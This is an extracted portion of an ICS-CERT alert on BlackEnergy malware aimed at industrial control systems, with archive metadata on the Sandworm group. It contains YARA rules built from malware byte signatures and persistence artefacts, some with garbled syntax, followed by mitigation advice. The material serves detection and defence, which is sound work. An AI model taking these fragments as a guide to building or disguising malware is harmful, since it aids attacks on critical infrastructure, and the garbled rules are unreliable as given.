00 64 00 6F 00 77 00 73 00 53 00 79 00**\n**73 00 55 00 74 00 69 00 6C 00 69 00 74 00 79 00 20 00 2D 00 20 00 55 00 6E 00 69 00 63 00 6F 00 64 00 65 00 00 00**\n**42 00 0F 00 01 00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 35 00**\n**2E 00 30 00 2E 00 37 00 36 00 30 00 31 00 2E 00 31 00 37 00 35 00 31 00 34 00 00 00 00 00 44 00 00 00 01 00 56 00**\n**61 00 72 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 00 00 24 00 04 00 00 00 54 00 72 00 61 00 6E 00**\n**73 00 6C 00 61 00 74 00 69 00 6F 00 6E 00 00 00 00 00 09 04 B0 04}**\n\n**$b6 = {D4 02 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00 4F 00 4E 00 5F 00 49 00**\n**4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00 00 01 00 01 00 05 00 88 15 28 0A 01 00 05 00 88 15 28 0A 17 00 00 00**\n**00 00 00 00 04 00 04 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 34 02 00 00 01 00 53 00 74 00 72 00 69 00 6E**\n**00 67 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 10 02 00 00 01 00 30 00 34 00 30 00 39 00 30 00 34**\n**00 65 00 34 00 00 00 4C 00 16 00 01 00 43 00 6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00**\n**00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69**\n**00 6F 00 6E 00 00 00 4E 00 13 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00 69 00 70 00 74 00 69**\n**00 6F 00 6E 00 00 00 00 00 53 00 65 00 72 00 69 00 61 00 6C 00 20 00 50 00 6F 00 72 00 74 00 20 00 44 00 72 00 69**\n**00 76 00 65 00 72 00 00 00 00 00 62 00 21 00 01 00 46 00 69 00 6C 00 65 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E**\n**00 00 00 00 00 35 00 2E 00 31 00 2E 00 32 00 36 00 30 00 30 00 2E 00 35 00 35 00 31 00 32 00 20 00 28 00 78 00 70**\n**00 73 00 70 00 2E 00 30 00 38 00 30 00 34 00 31 00 33 00 2D 00 30 00 38 00 35 00 32 00 29 00 00 00 00 00 4A 00 13**\n**00 01 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 43 00 6F 00 70**\n**00 79 00 72 00 69 00 67 00 68 00 74 00 20 00 28 00 43 00 29 00 20 00 32 00 30 00 30 00 34 00 00 00 00 00 6A 00 25 00**\n**01 00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 4D 00 69 00 63 00 72 00 6F 00**\n**73 00 6F 00 66 00 74 00 AE 00 20 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 AE 00 20 00 4F 00 70 00 65 00 72 00**\n**61 00 74 00 69 00 6E 00 67 00 20 00 53 00 79 00 73 00 74 00 65 00 6D 00 00 00 00 00 40 00 0E 00 01 00 50 00 72 00**\n**6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 35 00 2E 00 31 00 2E 00 32 00 36 00**\n**30 00 30 00 2E 00 35 00 35 00 31 00 32 00 00 00 44 00 00 00 01 00 56 00 61 00 72 00 46 00 69 00 6C 00 65 00 49 00**\n**6E 00 66 00 6F 00 00 00 00 00 24 00 04 00 00 00 54 00 72 00 61 00 6E 00 73 00 6C 00 61 00 74 00 69 00 6F 00 6E 00**\n**00 00 00 00 09 04 E4 04}**\n\n**condition:**\n\n**(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and (((any of ($a*)) and**\n**(uint32(uint32(0x3C)+8) == 0x00000000)) or (for any of ($b*): ($ in (uint32(uint32(0x3C)+248+(40***\n**(uint16(uint32(0x3C)+6)-1)+20))..(uint32(uint32(0x3C)+248+(40*(uint16(uint32(0x3C)+6)-**\n**1)+20))+uint32(uint32(0x3C)+248+(40*(uint16(uint32(0x3C)+6)-1)+16)))))))**\n\n**}**\n\n**rule BlackEnergy2_USBInfected**\n\n**//ICS-CERT rule to detect .exe's infected by BlackEnergy JN plugin for JN versions 7 (full), 75 (light)**\n\n**//version 1**\n\n**{**\n\n**strings:**\n\n**$f1 = {5E 81 EC 04 01 00 00 8B D4 68 04 01 00 00 52 6A 00 FF 57 1C 8B D4 33 C9 03 D0 4A 41 3B**\n**C8 74 05 80 3A 5C 75 F5 42 81 EC 04 01 00 00 8B DC 52 51 53 68 04 01 00 00 FF 57 20 59 5A 66 C7 04 03 5C 20 56**\n**57 8D 3C 03 8B F2 F3 A4 C6 07 00 5F 5E 33 C0 50 68 80 00 00 00 6A 02 50 50 68 00 00 00 40 53 FF 57 14 53 8B 4F 4C**\n**8B D6 33 DB 30 1A 42 43 3B D9 7C F8 5B 83 EC 04 8B D4 50 6A 00 52 FF 77 4C 8B D6 52 50 FF 57 24 FF 57 18}**\n\n**$f2 = {5E 83 EC 1C 8B 45 08 8B 4D 08 03 48 3C 89 4D E4 89 75 EC 8B 45 08 2B 45 10 89 45 E8 33**\n**C0 89 45 F4 8B 55 0C 3B 55 F4 0F 86 98 00 00 00 8B 45 EC 8B 4D F4 03 48 04 89 4D F4 8B 55 EC 8B 42 04 83 E8 08**\n**D1 E8 89 45 F8 8B 4D EC 83 C1 08 89 4D FC}**\n\n**$f3 = {5F 8B DF 83 C3 60 2B 5F 54 89 5C 24 20 8B 44 24 24 25 00 00 FF FF 66 8B 18 66 81 FB 4D**\n**5A 74 07 2D 00 00 01 00 EB EF 8B 48 3C 03 C8 66 8B 19 66 81 FB 50 45 75 E0 8B E8 8B F7 83 EC 60 8B FC B9 60 00**\n\n\n-----\n\n**condition:**\n\n**$a1 at entrypoint or any of ($f*)**\n\n**}**\n\n**rule BlackEnergy3**\n\n**//ICS-CERT rule to detect BlackEnergy3 versions 1.1.0 through 1.2.5**\n\n**//version 1**\n\n**{**\n\n**strings:**\n\n**//elements from the .LNK file created for persistence**\n\n**$l1 = {72 00 75 00 6E 00 64 00 6C 00 6C 00 33 00 32 00 2E 00 65 00 78 00 65 00 00 00 1C 00 00 00**\n**2C 00 2E 00 2E 00 5C 00 2E 00 2E 00 5C 00 2E 00 2E 00 5C 00 2E 00 2E 00 5C 00 2E 00 2E 00 5C 00 57 00 49 00 4E**\n**00 44 00 4F 00 57 00 53 00 5C 00 73 00 79 00 73 00 74 00 65 00 6D 00 33 00 32 00 5C 00 72 00 75 00 6E 00 64 00 6C**\n**00 6C 00 33 00 32 00 2E 00 65 00 78 00 65 00 13 00 43 00 3A 00 5C 00 57 00 49 00 4E 00 44 00 4F 00 57 00 53 00 5C**\n**00 73 00 79 00 73 00 74 00 65 00 6D 00 33 00 32 00 5C 00 22 00 43 00 3A 00 5C 00 44 00 6F 00 63 00 75 00 6D 00 65**\n**00 6E 00 74 00 73 00 20 00 61 00 6E 00 64 00 20 00 53 00 65 00 74 00 74 00 69 00 6E 00 67 00 73 00 5C 00 41 00 64**\n**00 6D 00 69 00 6E 00 69 00 73 00 74 00 72 00 61 00 74 00 6F 00 72 00 5C 00 4C 00 6F 00 63 00 61 00 6C 00 20 00 53**\n**00 65 00 74 00 74 00 69 00 6E 00 67 00 73 00 5C 00 41 00 70 00 70 00 6C 00 69 00 63 00 61 00 74 00 69 00 6F 00 6E**\n**00 20 00 44 00 61 00 74 00 61 00 5C}**\n\n**//resource from loader file**\n\n**$r1 = {78 03 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00 4F 00 4E 00 5F 00 49 00**\n**4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00 00 01 00 00 00 05 00 6A 44 B1 1D 00 00 05 00 6A 44 B1 1D 3F 00 00 00**\n**00 00 00 00 04 00 04 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 D6 02 00 00 01 00 53 00 74 00 72 00 69 00**\n**6E 00 67 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 B2 02 00 00 01 00 30 00 34 00 30 00 39 00 30 00**\n**34 00 42 00 30 00 00 00 4C 00 16 00 01 00 43 00 6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00**\n**00 00 4D 00 69 00 63 00 72 00 6F 00 00 00 6F 00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F 00 72 00 61 00 74 00**\n**69 00 6F 00 6E 00 00 00 4E 00 13 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00 69 00 70 00 74 00**\n**69 00 6F 00 6E 00 00 00 00 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 AE 00 53 00 79 00 73 00 55 00 74 00 69 00**\n**6C 00 69 00 74 00 79 00 00 00 00 00 72 00 29 00 01 00 46 00 69 00 6C 00 65 00 56 00 65 00 72 00 73 00 69 00 6F 00**\n**6E 00 00 00 00 00 35 00 2E 00 30 00 2E 00 37 00 36 00 30 00 31 00 2E 00 31 00 37 00 35 00 31 00 34 00 20 00 28 00**\n**77 00 69 00 6E 00 37 00 73 00 70 00 31 00 5F 00 72 00 74 00 6D 00 2E 00 31 00 30 00 31 00 31 00 31 00 39 00 2D 00**\n**31 00 38 00 35 00 30 00 29 00 00 00 00 00 30 00 08 00 01 00 49 00 6E 00 74 00 65 00 72 00 6E 00 61 00 6C 00 4E 00**\n**61 00 6D 00 65 00 00 00 6D 00 73 00 69 00 65 00 78 00 65 00 63 00 00 00 80 00 2E 00 01 00 4C 00 65 00 67 00 61 00**\n**6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 A9 00 20 00 4D 00 69 00 63 00 72 00 6F 00 73 00**\n**6F 00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69 00 6F 00 6E 00 2E 00 20 00 41 00 6C 00**\n**6C 00 20 00 72 00 69 00 67 00 68 00 74 00 73 00 20 00 72 00 65 00 73 00 65 00 72 00 76 00 65 00 64 00 2E 00 00 00**\n**40 00 0C 00 01 00 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00**\n**00 00 6D 00 73 00 69 00 65 00 78 00 65 00 63 00 2E 00 65 00 78 00 65 00 00 00 58 00 1C 00 01 00 50 00 72 00 6F 00**\n**64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 53 00 79 00**\n**73 00 55 00 74 00 69 00 6C 00 69 00 74 00 79 00 20 00 2D 00 20 00 55 00 6E 00 69 00 63 00 6F 00 64 00 65 00 00 00**\n**42 00 0F 00 01 00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 00 00 00 00 35 00**\n**2E 00 30 00 2E 00 37 00 36 00 30 00 31 00 2E 00 31 00 37 00 35 00 31 00 34 00 00 00 00 00 44 00 00 00 01 00 56 00**\n**61 00 72 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 00 00 24 00 04 00 00 00 54 00 72 00 61 00 6E 00**\n**73 00 6C 00 61 00 74 00 69 00 6F 00 6E 00 00 00 00 00 09 04 B0 04}**\n\n**//sections of code from loader**\n\n**$sa1 = {55 8B EC 83 EC 24 53 56 57 C7 45 F8 00 00 00 00 C7 45 F4 64 00 00 00 83 EC 10 C7 45 EC**\n**5A 00 00 00 C7 45 E0 46 00 00 00 C7 45 E8 5A 00 00 00 C7 45 E4 46 00 00 00 6A 01 8D 45 E0 50 E8 2F FC FF FF 89**\n**45 FC 8B 4D FC 89}**\n\n**condition:**\n\n**any of them**\n\n**}**\n\n**rule BlackEnergy_findFunc**\n\n**//ICS-CERT rule to detect BlackEnergy2 \"light\" and BlackEnergy3. Will not detect BE2 sys variant.**\n\n**//version 1**\n\n**{**\n\n**strings:**\n\n**$sb1 = {C7 [1-5] 33 32 2E 64 C7 [1-5] 77 73 32 5F 66 C7 [1-5] 6C 6C} //ws3_32.dll**\n\n**$sb2 = {C7 [1 5] 75 73 65 72 C7 [1 5] 33 32 2E 64 66 C7 [1 5] 6C 6C} //user32 dll**\n\n\n-----\n\n**$sb4 = {C7 [1-5] 77 69 6E 69 C7 [1-5] 6E 65 74 2E C7 [1-5] 64 6C 6C} //wininet.dll**\n\n**$sb5 = {C7 [1-5] 73 68 65 6C C7 [1-5] 6C 33 32 2E C7 [1-5] 64 6C 6C} //shell32.dll**\n\n**$sb6 = {C7 [1-5] 70 73 61 70 C7 [1-5] 69 2E 64 6C 66 C7 [1-5] 6C} //psapi.dll**\n\n**$sb7 = {C7 [1-5] 6E 65 74 61 C7 [1-5] 70 69 33 32 C7 [1-5] 2E 64 6C 6C} //netapi32.dll**\n\n**$sb8 = {C7 [1-5] 76 65 72 73 C7 [1-5] 69 6F 6E 2E C7 [1-5] 64 6C 6C} //version.dll**\n\n**$sb9 = {C7 [1-5] 6F 6C 65 61 C7 [1-5] 75 74 33 32 C7 [1-5] 2E 64 6C 6C} //oldaut32.dll**\n\n**$sb10 = {C7 [1-5] 69 6D 61 67 C7 [1-5] 65 68 6C 70 C7 [1-5] 2E 64 6C 6C} //imagehlp.dll**\n\n**condition:**\n\n**3 of them**\n\n**}**\n\n#### MITIGATIONS\n\n**ICS-CERT has published a TLP Amber version of this alert containing additional information about the malware, plug-ins,**\n**and indicators to the secure portal. ICS-CERT strongly encourages asset owners and operators to use these indicators to**\n**look for signs of compromise within their control systems environments. Asset owners and operators can request access**\n**[to this information by emailing ics-cert@dhs.gov](mailto:ics-cert@dhs.gov)** **.**\n\n**Any positive or suspected findings should be immediately reported to ICS-CERT for further analysis and correlation.**\n\n**ICS-CERT strongly encourages taking immediate defensive action to secure ICS systems using defense-in-depth**\n**[principles.CSSP Recommended Practices, https://ics-cert.us-cert.gov/Recommended-Practices, web site last accessed](https://ics-cert.us-cert.gov/Recommended-Practices)**\n**October 28, 2014. Asset owners should not assume that their control systems are deployed securely or that they are not**\n**operating with an Internet accessible configuration. Instead, asset owners should thoroughly audit their networks for**\n**Internet facing devices, weak authentication methods, and component vulnerabilities. Control systems often have Internet**\n**accessible devices installed without the owner’s knowledge, putting those systems at increased risk of attack.**\n\n**ICS-CERT recommends that users take defensive measures to minimize the risk of exploitation due to this unsecure**\n**device configuration of these vulnerabilities. Specifically, users should:**\n\n**Minimize network exposure for all control system devices. Control system devices should not directly face the Internet.**\n\n**Locate control system networks and devices behind firewalls, and isolate them from the business network.**\n\n**If remote access is required, employ secure methods, such as Virtual Private Networks (VPNs), recognizing that VPN**\n**is only as secure as the connected devices.**\n\n**Remove, disable, or rename any default system accounts wherever possible.**\n\n**Apply patches in the ICS environment, when possible to mitigate known vulnerabilities.**\n\n**Implement policies requiring the use of strong passwords.**\n\n**Monitor the creation of administrator level accounts by third-party vendors.**\n\n**ICS-CERT reminds organizations to perform proper impact analysis and risk assessment prior to taking defensive**\n**measures.**\n\n**ICS-CERT also provides a** **[recommended practices section for control systems on the ICS-CERT web site (](http://ics-cert.us-cert.gov/content/recommended-practices)** **http://ics-**\n**cert.us-cert.gov). Several recommended practices are available for reading or download, including** **Improving Industrial**\n**Control Systems Cybersecurity with Defense-in-Depth Strategies.**\n\n**Organizations that observe any suspected malicious activity should follow their established internal procedures and report**\n**their findings to ICS-CERT for tracking and correlation against other incidents.**\n\n\n**a.**\n\n**b.**\n\n**c.**\n\n**d.**\n\n**e.**\n\n**f.**\n\n**g.**\n\n\n**ICS-CERT encourages US asset owners and operators to join the control systems compartment of the US-CERT secure portal. To request**\n**[access to the secure portal send your name, email address, and company affiliation to ics-cert@hq.dhs.gov](mailto:ics-cert@hq.dhs.gov)** **.**\n\n**[Sandworm to Blacken: The SCADA Connection, http://blog.trendmicro.com/trendlabs-security-intelligence/sandworm-to-b...](http://blog.trendmicro.com/trendlabs-security-intelligence/sandworm-to-blacken-the-scada-connection/)** **web site last**\n**accessed October 28, 2014.**\n\n**[Sandworm Team – Targeting SCADA Systems, http://www.isightpartners.com/tag/sandworm-team/](http://www.isightpartners.com/tag/sandworm-team/)** **web site last accessed October 28,**\n**2014.**\n\n**[NVD, http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-4114, web site last accessed October 28, 2014.](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-4114)**\n\n**[GE Intelligent Platforms, http://support.ge-ip.com/support/index?page=kbchannel](http://support.ge-ip.com/support/index?page=kbchannel)** **. web site last accessed October 28, 2014.**\n\n**[GE, http://www.ge.com/security](http://www.ge.com/security)** **web site last accessed October 28, 2014.**\n\n**See “Nov 21, 2014 (second publication) Siemens Industrial Security Website: Update on ICS-CERT Alert on malware targeting SIMATIC**\n**[WinCC” (http://www.industry.siemens.com/topics/global/en/industrial-security/new...](http://www.industry.siemens.com/topics/global/en/industrial-security/news-alerts/Pages/alerts.aspx)** **)**\n\n\n#### Contact Information\n\n**For any questions related to this report, please contact ICS-CERT at:**\n\n\n-----\n\n**For industrial control systems security information and incident reporting:** **[http://ics-cert.us-cert.gov](http://ics-cert.us-cert.gov)**\n\n**ICS-CERT continuously strives to improve its products and services. You can help by choosing one of the links below to**\n**provide feedback about this product.**\n\n\n**Was this document helpful?** **[Yes | Somewhat | No](https://www.us-cert.gov/forms/feedback?helpful=yes&document=ICS-ALERT-14-281-01C&trackingNumber=&url=https://ics-cert.us-cert.gov/alerts/ICS-ALERT-14-281-01B&site_name=ICS-CERT)**\n\n\n### I Want To\n\n**[Report an ICS incident to ICS-CERT](mailto:ics-cert@hq.dhs.gov?Subject=Report an ICS Incident to ICS-CERT)**\n\n**[Report an ICS software vulnerability](mailto:ics-cert@hq.dhs.gov?Subject=Report an ICS Software Vulnerability)**\n\n**[Get information about Reporting](http://www.dhs.gov/report-cyber-risks)**\n\n**[Join the Secure Portal](mailto:ics-cert@hq.dhs.gov?subject=Request to join ICS-CERT Secure Portal&body=Name%3A%0AEmail address%3A%0ACompany Affiliation%3A)**\n\n\n### Subscribe to Alerts\n\n**Receive security alerts, advisories, announcements, and other updates.**\n\n**Enter your email address**\n\n\n**Enter your email address**\n\n\n**Sign Up**\n\n\n**Mailing Lists and**\n\n**Feeds**\n\n\n### Contact Us\n\n**U.S. Toll Free: (877) 776-7585**\n\n**International: (208) 526-0900**\n\n**Download PGP/GPG keys**\n\n**[ICS-Related Cyber Activity](mailto:ics-cert@hq.dhs.gov?Subject=ICS-Related Cyber Activity)**\n\n**[General ICS Questions](mailto:CSCExternalAffairs@hq.dhs.gov)**\n\n\n**Sign Up**\n\n\n**Follow ICS-CERT on**\n\n**Twitter**\n\n\n**Home** **FAQ** **[Traffic Light Protocol](http://www.us-cert.gov/tlp/)** **[Privacy & Use](http://www.us-cert.gov/privacy/)** **[Accessibility](http://www.us-cert.gov/accessibility/)** **[Get a PDF Reader](http://www.us-cert.gov/pdf/)**\n\n**[US-CERT is part of the Department of Homeland Security.](http://www.dhs.gov)**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2016/2016.01.28.BlackEnergy_APT/reference/ICS-ALERT-14-281-01B.pdf"
    ],
    "report_names": [
        "ICS-ALERT-14-281-01B"
    ],
    "threat_actors": [
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7bd810cb-d674-4763-86eb-2cc182d24ea0",
            "created_at": "2022-10-25T16:07:24.1537Z",
            "updated_at": "2025-03-27T02:02:10.126127Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "APT 44",
                "ATK 14",
                "BE2",
                "Blue Echidna",
                "CTG-7263",
                "FROZENBARENTS",
                "IRIDIUM",
                "Iron Viking",
                "Quedagh",
                "Sandworm",
                "Sandworm Team",
                "Seashell Blizzard",
                "TEMP.Noble",
                "UAC-0082",
                "UAC-0113",
                "UAC-0125",
                "UAC-0133",
                "Voodoo Bear"
            ],
            "source_name": "ETDA:Sandworm Team",
            "tools": [
                "AWFULSHRED",
                "ArguePatch",
                "BIASBOAT",
                "Black Energy",
                "BlackEnergy",
                "CaddyWiper",
                "Colibri Loader",
                "Cyclops Blink",
                "CyclopsBlink",
                "DCRat",
                "DarkCrystal RAT",
                "Fobushell",
                "GOSSIPFLOW",
                "Gcat",
                "IcyWell",
                "Industroyer2",
                "JaguarBlade",
                "JuicyPotato",
                "Kapeka",
                "KillDisk.NCX",
                "LOADGRIP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "ORCSHRED",
                "P.A.S.",
                "PassKillDisk",
                "Pitvotnacci",
                "PsList",
                "QUEUESEED",
                "RansomBoggs",
                "RottenPotato",
                "SOLOSHRED",
                "SwiftSlicer",
                "VPNFilter",
                "Warzone",
                "Warzone RAT",
                "Weevly"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041825,
    "ts_creation_date": 1454062964,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/547c04be6d9ef7f6c4df1bc978b101526a9948e4.pdf",
        "text": "https://archive.orkl.eu/547c04be6d9ef7f6c4df1bc978b101526a9948e4.txt",
        "img": "https://archive.orkl.eu/547c04be6d9ef7f6c4df1bc978b101526a9948e4.jpg"
    }
}